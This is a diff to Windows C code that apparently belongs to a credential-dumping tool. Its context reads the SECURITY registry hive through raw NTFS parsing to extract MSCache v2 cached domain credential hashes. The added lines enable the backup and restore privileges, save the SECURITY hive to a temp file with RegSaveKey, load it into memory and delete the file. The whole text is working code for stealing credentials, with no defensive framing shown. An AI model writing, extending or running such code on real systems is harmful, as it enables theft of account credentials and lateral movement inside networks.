@@ -20,6 +20,39 @@ static BOOL HiveGetVal(PBYTE h, SIZE_T sz, PWSTR n, PBYTE* v, PDWORD vs) {
     return FALSE;
 }
 
+// ─── Fallback helpers (RegSaveKey) for non-NTFS volumes ───
+static BOOL EnablePrivilege(LPCWSTR privName) {
+    HANDLE hTok = NULL;
+    if (!OpenProcessToken(GetCurrentProcess(),
+        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTok)) return FALSE;
+    TOKEN_PRIVILEGES tp = {0};
+    tp.PrivilegeCount = 1;
+    if (!LookupPrivilegeValueW(NULL, privName, &tp.Privileges[0].Luid)) {
+        CloseHandle(hTok); return FALSE;
+    }
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    BOOL ok = AdjustTokenPrivileges(hTok, FALSE, &tp, sizeof(tp), NULL, NULL);
+    DWORD err = GetLastError();
+    CloseHandle(hTok);
+    return ok && err == ERROR_SUCCESS;
+}
+
+static BOOL ReadHiveFile(PWSTR path, HIVE_DATA* h) {
+    HANDLE hf = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
+        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hf == INVALID_HANDLE_VALUE) return FALSE;
+    DWORD sz = GetFileSize(hf, NULL);
+    if (sz == INVALID_FILE_SIZE || sz == 0) { CloseHandle(hf); return FALSE; }
+    h->data = (PBYTE)VirtualAlloc(NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!h->data) { CloseHandle(hf); return FALSE; }
+    DWORD rd = 0;
+    BOOL ok = ReadFile(hf, h->data, sz, &rd, NULL) && rd == sz;
+    CloseHandle(hf);
+    if (!ok) { VirtualFree(h->data, 0, MEM_RELEASE); h->data = NULL; return FALSE; }
+    h->size = sz;
+    return TRUE;
+}
+
 // ─── Source 1: MSCache v2 from SECURITY hive ───
 static DWORD ExtractMSCache(PBYTE* outBlob, PSIZE_T outSz) {
     HANDLE hVol = CreateFileW(L"\\\\.\\C:", GENERIC_READ,
@@ -35,6 +68,27 @@ static DWORD ExtractMSCache(PBYTE* outBlob, PSIZE_T outSz) {
     ExtractFileFromNtfs(hVol, &ctx, mft, mftSz,
         L"\\Windows\\System32\\config\\SECURITY", &sec);
     CloseHandle(hVol); VirtualFree(mft, 0, MEM_RELEASE);
+
+    if (!sec.data) {
+        // Raw NTFS failed (ReFS etc.) — fallback: save SECURITY hive via RegSaveKey
+        wprintf(L"      [i] Raw NTFS failed — RegSaveKey fallback...\n");
+        EnablePrivilege(SE_BACKUP_NAME);
+        EnablePrivilege(SE_RESTORE_NAME);
+
+        WCHAR tmpDir[MAX_PATH], path[MAX_PATH];
+        if (GetTempPathW(MAX_PATH, tmpDir)) {
+            swprintf_s(path, MAX_PATH, L"%lsbench_security.hive", tmpDir);
+            HKEY hKey = NULL;
+            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SECURITY", 0, KEY_READ, &hKey)
+                == ERROR_SUCCESS) {
+                if (RegSaveKeyW(hKey, path, NULL) == ERROR_SUCCESS) {
+                    ReadHiveFile(path, &sec);
+                }
+                RegCloseKey(hKey);
+            }
+            DeleteFileW(path);
+        }
+    }
     if (!sec.data) return 0;
 
     DWORD cnt = 0;
